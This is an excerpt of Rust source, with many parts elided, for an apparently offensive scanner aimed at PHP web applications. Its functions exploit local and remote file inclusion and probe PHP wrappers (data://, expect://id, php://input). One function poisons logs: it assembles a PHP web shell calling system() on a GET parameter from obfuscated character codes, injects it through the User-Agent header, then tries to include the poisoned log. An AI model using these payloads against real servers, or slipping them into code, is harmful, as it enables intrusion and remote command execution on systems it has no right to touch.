...
pub async fn read(
    ...
    println!(
        "{} Could not read target file via LFI.",
        "[-]".yellow().bold()
    );
    Ok(())
}
...
pub async fn include(
    ...
    for payload in &payloads {
        ...
        if let Ok(resp) = client.get(&test_url).send().await {
            ...
            if !body.is_empty() && body.len() > 10 {
                println!(
                    "{} [HIGH] Potential RFI - remote content included!",
                    "[!]".red().bold()
                );
                println!("  {} Payload: {}", "*".cyan(), payload);
    ...
    println!(
        "{} No RFI detected. allow_url_include may be off.",
        "[-]".yellow().bold()
    );
    Ok(())
}
...
pub async fn wrapper(
    ...
    let wrappers = [
        ...
        (
            "data text",
            "data://text/plain;base64,PD9waHAgZWNobyAnWFhFJzsgPz4=",
        ),
        ("expect", "expect://id"),
        ("php input", "php://input"),
    ...
    println!(
        "\n{} Wrapper scan complete. Check for base64-encoded content.",
        "[*]".cyan().bold()
    );
    Ok(())
}
...
pub async fn log_poison(
    ...
    let s_func: String = [115, 121, 115, 116, 101, 109, 40]
        .iter()
        .map(|c| *c as u8 as char)
        .collect();
    let php_inner: String = format!("{}{}{}", s_func, "$_GET['cmd']", "); ?>");
    let php_tag = format!(
        "{}{}{}{}",
        char::from(60),
        char::from(63),
    ...
    println!(
        "{} Step 1: Poisoning access log with payload...",
        "[*]".cyan().bold()
    );
    let _ = client.get(url).header("User-Agent", &php_tag).send().await;

    println!(
        "{} Step 2: Attempting to include poisoned log...",
        "[*]".cyan().bold()
    );
    ...
    println!(
        "{} Log poisoning not successful with tested paths.",
        "[-]".yellow().bold()
    );
    Ok(())
}
